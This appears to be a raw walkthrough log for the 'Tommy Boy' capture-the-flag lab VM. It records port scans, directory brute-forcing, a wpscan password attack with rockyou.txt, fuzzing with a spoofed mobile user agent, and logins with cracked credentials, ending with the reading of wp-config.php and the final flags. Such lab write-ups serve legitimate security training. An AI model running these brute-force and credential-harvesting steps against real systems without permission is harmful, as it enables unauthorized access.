@@ -1,0 +1,528 @@
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu1 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 a0:ca:62:ce:f6:7e:ae:8b:62:de:0b:db:21:3f:b0:d6 (RSA)
+|   256 46:6d:4b:4b:02:86:89:27:28:5c:1d:87:10:55:3d:59 (ECDSA)
+|_  256 56:9e:71:2a:a3:83:ff:63:11:7e:94:08:dd:28:1d:46 (ED25519)
+80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Welcome to Callahan Auto
+| http-robots.txt: 4 disallowed entries 
+| /6packsofb...soda /lukeiamyourfather 
+|_/lookalivelowbridge /flag-numero-uno.txt
+8008/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: KEEP OUT
+
+http://192.168.56.140/flag-numero-uno.txt
+Flag data: B34rcl4ws
+
+
+
+http://192.168.56.140:8008/
+
+    This is only for Nick's super secret stuff. If you don't know where to go from here, you're not sup3rl33t enough.
+    Leave now!
+    Only me and Steve Jobs are allowed to look at this stuff.
+
+└─$ sudo dirsearch -u http://192.168.56.140                                                       
+/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
+
+
+[22:19:06] 301 -  315B  - /conf  ->  http://192.168.56.140/conf/
+[22:19:06] 200 -  402B  - /conf/
+[22:19:06] 200 -  410B  - /configuration/
+[22:19:07] 200 -  401B  - /cp/
+[22:19:07] 301 -  315B  - /cron  ->  http://192.168.56.140/cron/
+[22:19:07] 200 -  403B  - /cron/
+[22:19:07] 200 -  408B  - /custom/
+[22:19:07] 301 -  313B  - /db  ->  http://192.168.56.140/db/
+[22:19:07] 200 -  401B  - /db/
+[22:19:07] 301 -  316B  - /debug  ->  http://192.168.56.140/debug/
+[22:19:07] 200 -  408B  - /debug/
+[22:19:07] 301 -  318B  - /default  ->  http://192.168.56.140/default/
+[22:19:07] 301 -  317B  - /delete  ->  http://192.168.56.140/delete/
+[22:19:07] 301 -  315B  - /demo  ->  http://192.168.56.140/demo/
+[22:19:07] 200 -  402B  - /demo/
+[22:19:07] 301 -  317B  - /deploy  ->  http://192.168.56.140/deploy/
+[22:19:08] 301 -  314B  - /dev  ->  http://192.168.56.140/dev/
+[22:19:08] 200 -  402B  - /dev/
+[22:19:08] 200 -  403B  - /devel/
+[22:19:08] 200 -  406B  - /docs/
+[22:19:08] 301 -  317B  - /docs51  ->  http://192.168.56.140/docs51/
+[22:19:08] 301 -  317B  - /donate  ->  http://192.168.56.140/donate/
+[22:19:08] 301 -  315B  - /down  ->  http://192.168.56.140/down/
+[22:19:08] 301 -  319B  - /download  ->  http://192.168.56.140/download/
+[22:19:08] 200 -  410B  - /download/
+[22:19:08] 200 -  403B  - /down/
+[22:19:08] 301 -  320B  - /downloads  ->  http://192.168.56.140/downloads/
+[22:19:08] 200 -  410B  - /downloads/
+[22:19:08] 301 -  315B  - /dump  ->  http://192.168.56.140/dump/
+[22:19:08] 200 -  407B  - /dump/
+[22:19:08] 301 -  317B  - /e-mail  ->  http://192.168.56.140/e-mail/
+[22:19:08] 200 -  403B  - /engine/
+[22:19:09] 200 -  408B  - /fcgi-bin/
+[22:19:09] 301 -  319B  - /features  ->  http://192.168.56.140/features/
+[22:19:09] 301 -  319B  - /feedback  ->  http://192.168.56.140/feedback/
+[22:19:09] 301 -  315B  - /file  ->  http://192.168.56.140/file/
+[22:19:09] 200 -  402B  - /file/
+[22:19:09] 301 -  320B  - /fileadmin  ->  http://192.168.56.140/fileadmin/
+[22:19:09] 200 -  410B  - /fileadmin/
+[22:19:09] 301 -  316B  - /files  ->  http://192.168.56.140/files/
+[22:19:09] 200 -  406B  - /files/
+[22:19:09] 200 -  409B  - /gateway/
+[22:19:09] 301 -  314B  - /get  ->  http://192.168.56.140/get/
+[22:19:09] 301 -  319B  - /glossary  ->  http://192.168.56.140/glossary/
+[22:19:10] 301 -  319B  - /graphics  ->  http://192.168.56.140/graphics/
+[22:19:09] 301 -  313B  - /go  ->  http://192.168.56.140/go/
+[22:19:10] 200 -  406B  - /groovy/
+[22:19:10] 301 -  316B  - /group  ->  http://192.168.56.140/group/
+[22:19:10] 301 -  317B  - /guides  ->  http://192.168.56.140/guides/
+[22:19:10] 301 -  316B  - /guide  ->  http://192.168.56.140/guide/
+[22:19:10] 301 -  319B  - /homepage  ->  http://192.168.56.140/homepage/
+[22:19:10] 301 -  315B  - /home  ->  http://192.168.56.140/home/
+[22:19:10] 301 -  314B  - /ibm  ->  http://192.168.56.140/ibm/
+[22:19:10] 301 -  319B  - /iisadmin  ->  http://192.168.56.140/iisadmin/
+[22:19:10] 200 -  408B  - /iisadmin/
+[22:19:10] 301 -  316B  - /image  ->  http://192.168.56.140/image/
+[22:19:10] 301 -  319B  - /images01  ->  http://192.168.56.140/images01/
+[22:19:10] 200 -  404B  - /import/
+[22:19:10] 301 -  317B  - /import  ->  http://192.168.56.140/import/
+[22:19:10] 301 -  313B  - /in  ->  http://192.168.56.140/in/
+[22:19:10] 200 -  401B  - /in/
+[22:19:10] 301 -  319B  - /includes  ->  http://192.168.56.140/includes/
+[22:19:10] 200 -  408B  - /includes/
+[22:19:10] 301 -  316B  - /index  ->  http://192.168.56.140/index/
+[22:19:11] 301 -  314B  - /ini  ->  http://192.168.56.140/ini/
+[22:19:11] 301 -  324B  - /INSTALL_admin  ->  http://192.168.56.140/INSTALL_admin/
+[22:19:11] 301 -  319B  - /internal  ->  http://192.168.56.140/internal/
+[22:19:11] 301 -  319B  - /intranet  ->  http://192.168.56.140/intranet/
+[22:19:11] 301 -  319B  - /internet  ->  http://192.168.56.140/internet/
+[22:19:11] 301 -  324B  - /international  ->  http://192.168.56.140/international/
+[22:19:11] 301 -  313B  - /it  ->  http://192.168.56.140/it/
+[22:19:11] 301 -  317B  - /issues  ->  http://192.168.56.140/issues/
+[22:19:11] 301 -  312B  - /j  ->  http://192.168.56.140/j/
+[22:19:11] 301 -  315B  - /java  ->  http://192.168.56.140/java/
+[22:19:11] 200 -  405B  - /js/
+[22:19:11] 200 -  413B  - /jsp-examples/
+[22:19:11] 301 -  315B  - /jsps  ->  http://192.168.56.140/jsps/
+[22:19:11] 301 -  318B  - /kontakt  ->  http://192.168.56.140/kontakt/
+[22:19:11] 301 -  312B  - /l  ->  http://192.168.56.140/l/
+[22:19:11] 301 -  315B  - /lang  ->  http://192.168.56.140/lang/
+[22:19:11] 301 -  319B  - /language  ->  http://192.168.56.140/language/
+[22:19:11] 200 -  406B  - /ldap/
+[22:19:12] 301 -  318B  - /letmein  ->  http://192.168.56.140/letmein/
+[22:19:12] 200 -  404B  - /letmein/
+[22:19:12] 200 -  402B  - /lg/
+[22:19:12] 301 -  313B  - /lg  ->  http://192.168.56.140/lg/
+[22:19:12] 301 -  314B  - /lib  ->  http://192.168.56.140/lib/
+[22:19:12] 200 -  402B  - /lib/
+[22:19:12] 301 -  318B  - /library  ->  http://192.168.56.140/library/
+[22:19:12] 301 -  316B  - /links  ->  http://192.168.56.140/links/
+[22:19:12] 301 -  316B  - /linux  ->  http://192.168.56.140/linux/
+[22:19:12] 301 -  319B  - /logfiles  ->  http://192.168.56.140/logfiles/
+[22:19:12] 301 -  316B  - /login  ->  http://192.168.56.140/login/
+[22:19:12] 200 -  403B  - /login/
+[22:19:12] 301 -  315B  - /logo  ->  http://192.168.56.140/logo/
+[22:19:12] 301 -  317B  - /logout  ->  http://192.168.56.140/logout/
+[22:19:12] 200 -  408B  - /logout/
+[22:19:12] 200 -  406B  - /Logs/
+[22:19:12] 301 -  314B  - /mac  ->  http://192.168.56.140/mac/
+[22:19:12] 301 -  319B  - /magazine  ->  http://192.168.56.140/magazine/
+[22:19:12] 301 -  318B  - /mailman  ->  http://192.168.56.140/mailman/
+[22:19:12] 200 -  409B  - /mailman/
+[22:19:12] 301 -  315B  - /main  ->  http://192.168.56.140/main/
+[22:19:12] 200 -  407B  - /main/
+[22:19:13] 301 -  317B  - /manage  ->  http://192.168.56.140/manage/
+[22:19:13] 200 -  407B  - /manage/
+[22:19:13] 301 -  321B  - /management  ->  http://192.168.56.140/management/
+[22:19:13] 200 -  411B  - /management/
+[22:19:13] 301 -  318B  - /manager  ->  http://192.168.56.140/manager/
+[22:19:13] 200 -  408B  - /manager/
+[22:19:13] 301 -  314B  - /map  ->  http://192.168.56.140/map/
+[22:19:13] 301 -  317B  - /market  ->  http://192.168.56.140/market/
+[22:19:13] 200 -  403B  - /master/
+[22:19:13] 301 -  315B  - /menu  ->  http://192.168.56.140/menu/
+[22:19:13] 301 -  316B  - /mssql  ->  http://192.168.56.140/mssql/
+[22:19:14] 301 -  317B  - /movies  ->  http://192.168.56.140/movies/
+[22:19:14] 200 -  408B  - /mssql/
+[22:19:14] 301 -  314B  - /mp3  ->  http://192.168.56.140/mp3/
+[22:19:14] 301 -  316B  - /music  ->  http://192.168.56.140/music/
+[22:19:14] 301 -  312B  - /n  ->  http://192.168.56.140/n/
+[22:19:14] 301 -  314B  - /old  ->  http://192.168.56.140/old/
+[22:19:14] 200 -  402B  - /old/
+[22:19:14] 301 -  317B  - /oracle  ->  http://192.168.56.140/oracle/
+[22:19:15] 200 -  402B  - /out/
+[22:19:15] 301 -  318B  - /partner  ->  http://192.168.56.140/partner/
+[22:19:15] 301 -  317B  - /papers  ->  http://192.168.56.140/papers/
+[22:19:15] 301 -  320B  - /passwords  ->  http://192.168.56.140/passwords/
+[22:19:15] 200 -  410B  - /passwords/
+[22:19:15] 200 -  407B  - /path/
+[22:19:15] 301 -  314B  - /pdf  ->  http://192.168.56.140/pdf/
+[22:19:15] 301 -  315B  - /perl  ->  http://192.168.56.140/perl/
+[22:19:15] 301 -  316B  - /photo  ->  http://192.168.56.140/photo/
+[22:19:15] 301 -  318B  - /phoenix  ->  http://192.168.56.140/phoenix/
+[22:19:15] 301 -  321B  - /phpMyAdmin  ->  http://192.168.56.140/phpMyAdmin/
+[22:19:16] 200 -  411B  - /phpMyAdmin/
+[22:19:16] 301 -  315B  - /ping  ->  http://192.168.56.140/ping/
+[22:19:16] 301 -  319B  - /pictures  ->  http://192.168.56.140/pictures/
+[22:19:16] 301 -  320B  - /pipermail  ->  http://192.168.56.140/pipermail/
+[22:19:16] 301 -  316B  - /pixel  ->  http://192.168.56.140/pixel/
+[22:19:16] 301 -  318B  - /plugins  ->  http://192.168.56.140/plugins/
+[22:19:16] 200 -  408B  - /plugins/
+[22:19:17] 200 -  409B  - /publish/
+[22:19:17] 301 -  320B  - /publisher  ->  http://192.168.56.140/publisher/
+[22:19:17] 200 -  404B  - /puppet/
+[22:19:17] 301 -  314B  - /put  ->  http://192.168.56.140/put/
+[22:19:17] 301 -  316B  - /radio  ->  http://192.168.56.140/radio/
+[22:19:17] 301 -  319B  - /register  ->  http://192.168.56.140/register/
+[22:19:17] 301 -  319B  - /releases  ->  http://192.168.56.140/releases/
+[22:19:17] 301 -  318B  - /reports  ->  http://192.168.56.140/reports/
+[22:19:18] 301 -  318B  - /reviews  ->  http://192.168.56.140/reviews/
+[22:19:18] 301 -  318B  - /results  ->  http://192.168.56.140/results/
+[22:19:18] 200 -  113B  - /robots.txt
+[22:19:18] 301 -  315B  - /root  ->  http://192.168.56.140/root/
+[22:19:18] 200 -  402B  - /root/
+[22:19:18] 200 -  402B  - /rpc/
+[22:19:18] 301 -  317B  - /schema  ->  http://192.168.56.140/schema/
+[22:19:18] 301 -  315B  - /save  ->  http://192.168.56.140/save/
+[22:19:18] 301 -  317B  - /script  ->  http://192.168.56.140/script/
+[22:19:18] 200 -  401B  - /script/
+[22:19:18] 301 -  318B  - /science  ->  http://192.168.56.140/science/
+[22:19:22] 301 -  315B  - /uddi  ->  http://192.168.56.140/uddi/
+[22:19:22] 200 -  402B  - /ui/
+[22:19:22] 301 -  313B  - /ui  ->  http://192.168.56.140/ui/
+[22:19:22] 301 -  317B  - /upload  ->  http://192.168.56.140/upload/
+[22:19:22] 200 -  408B  - /upload/
+[22:19:22] 301 -  318B  - /uploads  ->  http://192.168.56.140/uploads/
+[22:19:22] 301 -  314B  - /url  ->  http://192.168.56.140/url/
+[22:19:22] 301 -  315B  - /user  ->  http://192.168.56.140/user/
+[22:19:22] 200 -  408B  - /uploads/
+[22:19:22] 200 -  407B  - /user/
+[22:19:22] 200 -  406B  - /usr/
+[22:19:22] 301 -  316B  - /utils  ->  http://192.168.56.140/utils/
+[22:19:22] 301 -  312B  - /v  ->  http://192.168.56.140/v/
+[22:19:22] 301 -  314B  - /usr  ->  http://192.168.56.140/usr/
+[22:19:23] 301 -  318B  - /version  ->  http://192.168.56.140/version/
+[22:19:23] 200 -  407B  - /version/
+[22:19:23] 200 -  409B  - /WEB-INF/
+[22:19:23] 301 -  318B  - /WEB-INF  ->  http://192.168.56.140/WEB-INF/
+[22:19:23] 301 -  319B  - /webadmin  ->  http://192.168.56.140/webadmin/
+[22:19:23] 200 -  403B  - /web/
+
+http://192.168.56.140/robots.txt
+User-agent: *
+Disallow: /6packsofb...soda
+Disallow: /lukeiamyourfather
+Disallow: /lookalivelowbridge
+Disallow: /flag-numero-uno.txt
+
+
+Tommy Boy - "Hey Prehistoric Forest"
+
+http://192.168.56.140/prehistoricforest/
+
+wpscan --url http://192.168.56.140/prehistoricforest/ -U u.txt -P /home/ed/Downloads/rockyou.txt
+//a wp webpage under this dirc
+
+[+] Performing password attack on Wp Login against 5 user/s
+Trying michelle / Lets you update your FunNotes and more! Time: 00:11:34 <> (113756 / 71721960)  0.1[SUCCESS] - tom / tomtom1     
+
+
+
+http://192.168.56.140/prehistoricforest/index.php/2016/07/06/announcing-the-callahan-internal-company-blog/#comment-5
+Well put boss 😉
+
+Flag #2: thisisthesecondflagyayyou.txt
+
+'http://192.168.56.140/prehistoricforest/thisisthesecondflagyayyou.txt
+You've got 2 of five flags - keep it up!
+
+Flag data: Z4l1nsky
+
+
+
+Hey numbnuts, look at the /richard folder on this server. I’m sure that picture will jog your memory.
+
+Since you have a small brain: see up top in the address bar thingy? Erase “/prehistoricforest” and put “/richard” there instead.
+
+
+http://192.168.56.140/richard/shockedrichard.jpg
+
+─$ exiftool shockedrichard.jpg
+File Permissions                : -rw-rw-r--
+File Type                       : JPEG
+File Type Extension             : jpg
+MIME Type                       : image/jpeg
+JFIF Version                    : 1.01
+Resolution Unit                 : None
+X Resolution                    : 1
+Y Resolution                    : 1
+Exif Byte Order                 : Little-endian (Intel, II)
+Software                        : Google
+Copyright                       : Copyright © 1995 Paramount Pictures Corporation. Credit: © 1995 Paramount Pictures / Courtesy: Pyxurz.
+Exif Version                    : 0220
+User Comment                    : ce154b5a8e59c89732bc25d6a2e6b90b
+Exif Image Width                : 1600
+
+ce154b5a8e59c89732bc25d6a2e6b90b   //md5
+spanky  //passwd of richard
+
+http://192.168.56.140/prehistoricforest/index.php/2016/07/06/status-of-restoring-company-home-page/
+
+
+    I left a few other bits of information in my home folder, which the new guy can access via FTP.  Oh, except I should mention that the FTP server is super flaky and I haven’t had the time (i.e. I don’t give a fat crap) to fix it.  Basically I couldn’t get it running on the standard port, so I put it on a port that most scanners would get exhausted looking for.  And to make matters more fun, the server seems to go online at the top of the hour for 15 minutes, then down for 15 minutes, then up again, then down again.  Now it’s somebody else’s problem (did I mention I don’t give a rat’s behind?).
+
+    You asked me to leave you with my account password for the server, and instead of laughing in your face (which is what I WANTED to do), I just reset my account (“nickburns” in case you’re dumb and can’t remember) to a very, VERY easy to guess password.  I removed my SSH access because I *DON’T* want you calling me in case of an emergency.  But my creds still work on FTP.  Your new fresh fish can connect using my credentials and if he/she has half a brain.
+
+//so scan again
+└─$ nmap -p- 192.168.56.140        
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-13 23:10 PDT
+Nmap scan report for 192.168.56.140
+Host is up (0.00010s latency).
+Not shown: 65531 closed tcp ports (reset)
+PORT      STATE SERVICE
+22/tcp    open  ssh
+80/tcp    open  http
+8008/tcp  open  http
+65534/tcp open  unknown
+
+└─$ ftp 192.168.56.140 65534
+Connected to 192.168.56.140.
+220 Callahan_FTP_Server 1.3.5
+Name (192.168.56.140:ed): nickburns
+331 Password required for nickburns
+Password: 
+230 User nickburns logged in
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp> ls
+229 Entering Extended Passive Mode (|||12861|)
+150 Opening ASCII mode data connection for file list
+-rw-rw-r--   1 nickburns nickburns      977 Jul 15  2016 readme.txt
+226 Transfer complete
+ftp> more readme.txt
+To my replacement:
+
+If you're reading this, you have the unfortunate job of taking over IT responsibilities
+from me here at Callahan Auto.  HAHAHAHAHAAH! SUCKER!  This is the worst job ever!  You'll be
+surrounded by stupid monkeys all day who can barely hit Ctrl+P and wouldn't know a fax machine
+from a flame thrower!
+
+Anyway I'm not completely without mercy.  There's a subfolder called "NickIzL33t" on this server
+somewhere. I used it as my personal dropbox on the company's dime for years.  Heh. LOL.
+I cleaned it out (no naughty pix for you!) but if you need a place to dump stuff that you want
+to look at !!!on your phone!!! later, consider that folder my gift to you.
+
+Oh by the way, Big Tom's a moron and always forgets his passwords and so I made an encrypted
+.zip of his passwords and put them in the "NickIzL33t" folder as well.  But guess what?
+He always forgets THAT password as well.  Luckily I'm a nice guy and left him a hint sheet.
+
+Good luck, schmuck!
+
+LOL.
+
+-Nick
+
+http://192.168.56.140/prehistoricforest/
+    Nick's sup3r s3cr3t dr0pb0x - only me and Steve Jobs can see this content
+
+//we try to visit it from phone, by using burp s and set user agent to ios
+//Mozilla/5.0 (iPhone; CPU iPhone OS 17_7_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/135.0.7049.83 Mobile/15E148 Safari/604.1
+
+    <title>Congrats, genius</title>
+    <h1>Well, you passed the dummy test</h1>
+    <h2>But Nick's secret door isn't that easy to open.</h2>
+    <h3>Gotta know the EXACT name of the .html to break into this fortress.</h3>
+    <h4>Good luck brainiac.</h4>
+    <h5>Lol</h5>
+    -Nick
+
+//it seems we need to fuzz the name of this html file.
+ffuf -w /home/ed/Downloads/rockyou.txt -u http://192.168.56.140:8008/NickIzL33t/FUZZ.html -H "user-agent: Mozilla/5.0 (iPhone; CPU iPhone OS 17_7_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/135.0.7049.83 Mobile/15E148 Safari/604.1" --fc 404
+//ffuf is faster than wfuzz
+#1brat                  [Status: 200, Size: 270, Words: 29, Lines: 10, Duration: 2ms]
+#1BITCH                 [Status: 200, Size: 270, Words: 29, Lines: 10, Duration: 3ms]
+#1gurl                  [Status: 200, Size: 270, Words: 29, Lines: 10, Duration: 3ms]
+#1shorty                [Status: 200, Size: 270, Words: 29, Lines: 10, Duration: 2ms]
+#1nigga                 [Status: 200, Size: 270, Words: 29, Lines: 10, Duration: 0ms]
+#1monkey                [Status: 200, Size: 270, Words: 29, Lines: 10, Duration: 0ms]
+#1babygurl              [Status: 200, Size: 270, Words: 29, Lines: 10, Duration: 0ms]
+fallon1                 [Status: 200, Size: 459, Words: 56, Lines: 13, Duration: 0ms]
+#1balla                 [Status: 200, Size: 270, Words: 29, Lines: 10, Duration: 0ms]
+#1freak                 [Status: 200, Size: 270, Words: 29, Lines: 10, Duration: 7ms]
+#1mother                [Status: 200, Size: 270, Words: 29, Lines: 10, Duration: 10ms]
+#1playa                 [Status: 200, Size: 270, Words: 29, Lines: 10, Duration: 11ms]
+#1gangsta               [Status: 200, Size: 270, Words: 29, Lines: 10, Duration: 0ms]
+#1stunner               [Status: 200, Size: 270, Words: 29, Lines: 10, Duration: 6ms]
+
+//fallon1 is diff from others.
+
+
+GET /NickIzL33t/fallon1.html HTTP/1.1
+
+<html>
+<title>W 0 W!</title>
+Nice work.  Here are the goodies in Nick's personal super secret dropbox:
+<p>
+<ul>
+<li><a href="hint.txt">A hint</a> - you'll need it
+<li><a href="flagtres.txt">The third flag</a> - you're not hopeless after all
+<li><a href="t0msp4ssw0rdz.zip">Big Tom's encrypted pw backups</a> - because that big tub of dumb can never remember them
+</ul>
+<!--Note: Still working on file upload capabilities in the P4TCH_4D4MS folder-->
+</html>
+
+
+
+GET /NickIzL33t/hint.txt HTTP/1.1
+
+Your password vault is protected with (yep, you guessed it) a PASSWORD!  
+And because you were choosing stupidiculous passwords like "password123" and "brakepad" I
+enforced new password requirements on you...13 characters baby! MUAHAHAHAHAH!!!
+
+Your password is your wife's nickname "bev" (note it's all lowercase) plus the following:
+
+* One uppercase character
+* Two numbers
+* Two lowercase characters
+* One symbol
+* The year Tommy Boy came out in theaters
+
+
+GET /NickIzL33t/flagtres.txt HTTP/1.1
+THREE OF 5 FLAGS - you're awesome sauce.
+
+Flag data: TinyHead
+
+
+
+
+
+
+
+Callahan Auto Server
+----------------------------
+Username: bigtommysenior
+Password: fatguyinalittlecoat
+
+Note: after the "fatguyinalittlecoat" part there are some numbers, but I don't remember what they are.
+However, I wrote myself a draft on the company blog with that information.
+
+Callahan Company Blog
+----------------------------
+Username: bigtom(I think?)
+Password: ??? 
+Note: Whenever I ask Nick what the password is, he starts singing that famous Queen song.
+
+
+http://192.168.56.140/prehistoricforest/wp-admin/post.php?post=22&action=edit
+Ok so Nick always yells at me for forgetting the second part of my "ess ess eight (ache? H?) password so I'm writing it here:
+
+1938!!
+
+Nick, if you're reading this, I DON'T CARE IF I"M USING THIS THING AS A PASSWORD VAULT. YOU TOOK AWAY MY STICKIES SO I"LL PUT MY PASSWORDS ANY DANG PLACE I WANT.
+
+//so we got 
+    Username: bigtommysenior
+    Password: fatguyinalittlecoat1938!!
+
+─$ ssh bigtommysenior@192.168.56.140
+The authenticity of host '192.168.56.140 (192.168.56.140)' can't be established.
+ED25519 key fingerprint is SHA256:uM/HObhtq1QX9XQgJ+tCGJRWnzsQsaouADPEzvD9h2o.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '192.168.56.140' (ED25519) to the list of known hosts.
+bigtommysenior@192.168.56.140's password: 
+Welcome to Ubuntu 16.04 LTS (GNU/Linux 4.4.0-31-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com/
+
+143 packages can be updated.
+0 updates are security updates.
+
+
+Last login: Thu Jul 14 13:45:57 2016
+bigtommysenior@CallahanAutoSrv01:~$ id
+uid=1002(bigtommysenior) gid=1002(bigtommysenior) groups=1002(bigtommysenior
+
+bigtommysenior@CallahanAutoSrv01:~$ cat el-flag-numero-quatro.txt 
+YAY!  Flag 4 out of 5!!!! And you should now be able to restore the Callhan Web server to normal
+working status.
+
+Flag data: EditButton
+
+But...but...where's flag 5?  
+
+I'll make it easy on you.  It's in the root of this server at /5.txt
+
+
+
+bigtommysenior@CallahanAutoSrv01:/var/www/html/prehistoricforest$ cat wp-config.php 
+
+/** The name of the database for WordPress */
+define('DB_NAME', 'wordpress');
+
+/** MySQL database username */
+define('DB_USER', 'wordpressuser');
+
+/** MySQL database password */
+define('DB_PASSWORD', 'CaptainLimpWrist!!!');
+
+/** MySQL hostname */
+
+
+cat .5.txt
+FIFTH FLAG!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+YOU DID IT!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+OH RICHARD DON'T RUN AWAY FROM YOUR FEELINGS!!!!!!!!
+
+Flag data: Buttcrack
+
+Ok, so NOW what you do is take the flag data from each flag and blob it into one big chunk.
+So for example, if flag 1 data was "hi" and flag 2 data was "there" and flag 3 data was "you"
+you would create this blob:
+
+hithereyou
+
+Do this for ALL the flags sequentially, and this password will open the loot.zip in Big Tom's
+folder and you can call the box PWNED.
+
+all combined flag data is B34rcl4wsZ4l1nskyTinyHeadEditButtonButtcrack
+
+bigtommysenior@CallahanAutoSrv01:~$ unzip LOOT.ZIP 
+Archive:  LOOT.ZIP
+[LOOT.ZIP] THE-END.txt password: 
+password incorrect--reenter: 
+password incorrect--reenter: 
+  inflating: THE-END.txt             
+bigtommysenior@CallahanAutoSrv01:~$ ls
+LOOT.ZIP  THE-END.txt  callahanbak.bak  el-flag-numero-quatro.txt
+bigtommysenior@CallahanAutoSrv01:~$ cat THE-END.txt 
+YOU CAME.
+YOU SAW.
+YOU PWNED.
+
+Thanks to you, Tommy and the crew at Callahan Auto will make 5.3 cajillion dollars this year.
+
+GREAT WORK!
+
+I'd love to know that you finished this VM, and/or get your suggestions on how to make the next 
+one better.
+
+Please shoot me a note at 7ms @ 7ms.us with subject line "Here comes the meat wagon!"
+
+Or, get in touch with me other ways:
+
+* Twitter: @7MinSec
+* IRC (Freenode): #vulnhub (username is braimee)
+
+Lastly, please don't forget to check out www.7ms.us and subscribe to the podcast at
+bit.ly/7minsec
+
+</shamelessplugs>
+
+Thanks and have a blessed week!
+
+-Brian Johnson
+7 Minute Security
